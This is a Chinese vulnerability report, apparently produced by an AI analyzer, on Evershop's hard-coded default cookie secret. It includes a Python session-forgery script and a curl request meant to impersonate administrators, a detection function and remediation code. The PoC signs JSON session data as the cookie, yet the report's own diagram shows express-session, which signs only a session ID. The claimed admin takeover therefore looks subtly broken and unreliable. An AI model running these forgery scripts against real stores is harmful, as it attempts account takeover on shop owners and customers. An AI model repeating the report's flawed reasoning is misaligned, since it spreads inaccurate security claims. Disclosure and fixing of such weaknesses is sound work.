# Evershop 默认弱Cookie Secret漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：使用硬编码凭据 (CWE-798) / 安全配置错误 (CWE-16)
- **漏洞名称**：Evershop 默认Cookie Secret导致会话伪造漏洞
- **风险等级**：高危
- **概述**：Evershop使用`getCookieSecret()`函数获取Cookie签名密钥，该函数在未配置环境变量时返回硬编码的默认值`"keyboard cat"`。攻击者可利用此已知密钥伪造有效的会话Cookie，实现任意用户身份冒充和管理员权限获取。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：无
- **操作条件**：
  1. 目标系统未配置`system.session.cookieSecret`
  2. 攻击者知道默认密钥值（代码公开可见）
- **攻击特征**：使用默认密钥签名的伪造Cookie

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **会话伪造**：使用默认密钥签名任意会话数据
2. **身份冒充**：伪造任意用户（包括管理员）的会话
3. **权限提升**：普通用户可获得管理员权限
4. **认证绕过**：无需密码即可登录任意账户

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：定位漏洞代码**

文件：`packages/evershop/src/modules/auth/services/getCookieSecret.ts`
```typescript
import { getConfig } from '../../../lib/util/getConfig.js';

export const getCookieSecret = (): string =>
  getConfig('system.session.cookieSecret', 'keyboard cat');  // <-- 默认弱密钥
```

**步骤2：分析Cookie签名使用**

Cookie签名使用此密钥对会话数据进行HMAC签名，用于验证Cookie的完整性和真实性。

**步骤3：伪造会话Cookie**

```javascript
const cookie = require('cookie-signature');

// 默认密钥
const SECRET = 'keyboard cat';

// 伪造管理员会话
const sessionData = {
  adminUser: {
    id: 1,
    email: 'admin@example.com',
    isAdmin: true
  }
};

// 签名会话
const signedSession = cookie.sign(
  Buffer.from(JSON.stringify(sessionData)).toString('base64'),
  SECRET
);

console.log('Forged Cookie:', signedSession);
```

**步骤4：使用伪造Cookie访问系统**

```bash
curl -X GET 'https://target.com/admin/dashboard' \
  -H 'Cookie: session=forged-signed-session-value'
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Session Forgery PoC
利用默认Cookie Secret伪造会话
"""

import hmac
import hashlib
import base64
import json
import requests

class SessionForger:
    def __init__(self, secret='keyboard cat'):
        self.secret = secret

    def sign(self, value):
        """
        模拟cookie-signature的签名逻辑
        """
        signature = hmac.new(
            self.secret.encode(),
            value.encode(),
            hashlib.sha256
        ).digest()
        sig_base64 = base64.b64encode(signature).decode()
        # 移除填充
        sig_base64 = sig_base64.replace('=', '')
        return f"{value}.{sig_base64}"

    def forge_admin_session(self, admin_id=1, email='admin@example.com'):
        """
        伪造管理员会话
        """
        session_data = {
            "adminUser": {
                "admin_user_id": admin_id,
                "email": email,
                "status": 1
            }
        }

        # 将会话数据编码
        encoded_data = base64.b64encode(
            json.dumps(session_data).encode()
        ).decode()

        # 签名
        signed_session = self.sign(encoded_data)
        return signed_session

    def forge_customer_session(self, customer_id, uuid, email):
        """
        伪造客户会话
        """
        session_data = {
            "customerID": customer_id,
            "uuid": uuid,
            "email": email
        }

        encoded_data = base64.b64encode(
            json.dumps(session_data).encode()
        ).decode()

        signed_session = self.sign(encoded_data)
        return signed_session


def exploit(target_url):
    """
    执行会话伪造攻击
    """
    forger = SessionForger()

    print("[*] 使用默认密钥 'keyboard cat' 伪造会话")

    # 1. 伪造管理员会话
    admin_session = forger.forge_admin_session()
    print(f"[+] 伪造的管理员会话: {admin_session[:50]}...")

    # 2. 尝试访问管理后台
    cookies = {'session': admin_session}
    response = requests.get(f"{target_url}/admin/dashboard", cookies=cookies)

    if response.status_code == 200 and 'dashboard' in response.text.lower():
        print("[+] 管理后台访问成功!")
        return True
    else:
        print(f"[-] 访问失败: {response.status_code}")
        return False


def main():
    target = "https://shop.example.com"

    print("=" * 60)
    print(" Evershop Session Forgery PoC")
    print("=" * 60)
    print()

    # 检查是否使用默认密钥
    forger = SessionForger()

    print("[*] 目标: ", target)
    print("[*] 默认密钥: 'keyboard cat'")
    print()

    # 伪造管理员会话
    print("[*] 伪造管理员会话...")
    admin_session = forger.forge_admin_session(
        admin_id=1,
        email='admin@target.com'
    )
    print(f"[+] 会话Cookie: {admin_session}")

    # 伪造普通用户会话
    print("\n[*] 伪造客户会话...")
    customer_session = forger.forge_customer_session(
        customer_id=100,
        uuid='victim-uuid-here',
        email='victim@example.com'
    )
    print(f"[+] 会话Cookie: {customer_session}")

    print("\n[!] 使用以下Cookie访问目标系统:")
    print(f"    Cookie: session={admin_session}")


if __name__ == "__main__":
    main()
```

### 4.2 检测脚本

```python
def check_default_secret(target_url):
    """
    检测目标是否使用默认Cookie Secret
    """
    forger = SessionForger('keyboard cat')

    # 创建测试会话
    test_session = forger.forge_admin_session(admin_id=99999)

    # 发送请求
    cookies = {'session': test_session}
    response = requests.get(f"{target_url}/admin", cookies=cookies, allow_redirects=False)

    # 如果没有返回401/403，可能使用了默认密钥
    if response.status_code not in [401, 403]:
        print("[!] 目标可能使用默认Cookie Secret!")
        return True
    else:
        print("[*] 目标可能已配置自定义密钥")
        return False
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              Cookie Secret 使用流程                             │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  配置检查:                                                      │
│  ┌─────────────────────────────────────────┐                  │
│  │ getCookieSecret()                       │                  │
│  │                                         │                  │
│  │ getConfig('system.session.cookieSecret',│                  │
│  │           'keyboard cat')  ← 默认值!    │                  │
│  │                                         │                  │
│  │ if (未配置) return 'keyboard cat'       │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 会话中间件                               │                  │
│  │                                         │                  │
│  │ express-session({                       │                  │
│  │   secret: getCookieSecret(), ← 使用弱密钥│                  │
│  │   cookie: { ... }                       │                  │
│  │ })                                      │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 攻击者利用                               │                  │
│  │                                         │                  │
│  │ 1. 获取默认密钥 'keyboard cat'          │                  │
│  │ 2. 构造会话数据 { adminUser: {...} }    │                  │
│  │ 3. 使用密钥签名                          │                  │
│  │ 4. 发送伪造Cookie                        │                  │
│  │ 5. 成功冒充管理员!                       │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **硬编码默认值**：代码中包含众所周知的默认密钥 `"keyboard cat"`
2. **配置依赖**：安全性完全依赖于运维人员配置自定义密钥
3. **无强制校验**：系统启动时不检查是否使用默认密钥
4. **源码公开**：默认值在开源代码中可见

## 6. 修复建议

### 6.1 方案A：启动时强制检查

```typescript
// getCookieSecret.ts
export const getCookieSecret = (): string => {
  const secret = getConfig('system.session.cookieSecret', null);

  if (!secret) {
    throw new Error(
      'CRITICAL: Cookie secret not configured! ' +
      'Please set system.session.cookieSecret in your configuration.'
    );
  }

  // 检查密钥强度
  if (secret.length < 32) {
    console.warn('WARNING: Cookie secret should be at least 32 characters');
  }

  return secret;
};
```

### 6.2 方案B：生成随机密钥

```typescript
import crypto from 'crypto';

export const getCookieSecret = (): string => {
  const configured = getConfig('system.session.cookieSecret', null);

  if (configured) {
    return configured;
  }

  // 生成随机密钥（仅本次运行有效）
  console.warn(
    'WARNING: No cookie secret configured. ' +
    'Generating random secret. Sessions will not persist across restarts.'
  );
  return crypto.randomBytes(64).toString('hex');
};
```

### 6.3 方案C：安装时强制配置

```javascript
// 安装脚本中添加
const readline = require('readline');
const crypto = require('crypto');

async function configureSecrets() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const answer = await new Promise(resolve => {
    rl.question('Generate secure cookie secret? (Y/n): ', resolve);
  });

  if (answer.toLowerCase() !== 'n') {
    const secret = crypto.randomBytes(64).toString('hex');
    // 写入配置文件
    console.log('Cookie secret generated and saved.');
  }
}
```

### 6.4 安全配置文档

```markdown
# 安全配置指南

## Cookie Secret 配置

**必须配置**: 在生产环境中，必须设置一个强随机密钥。

```bash
# 生成安全密钥
openssl rand -hex 64

# 配置方式1: 环境变量
export EVERSHOP_COOKIE_SECRET="your-64-char-random-string"

# 配置方式2: 配置文件
# config/production.json
{
  "system": {
    "session": {
      "cookieSecret": "your-64-char-random-string"
    }
  }
}
```

**警告**: 使用默认密钥 `keyboard cat` 将导致严重安全漏洞!
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
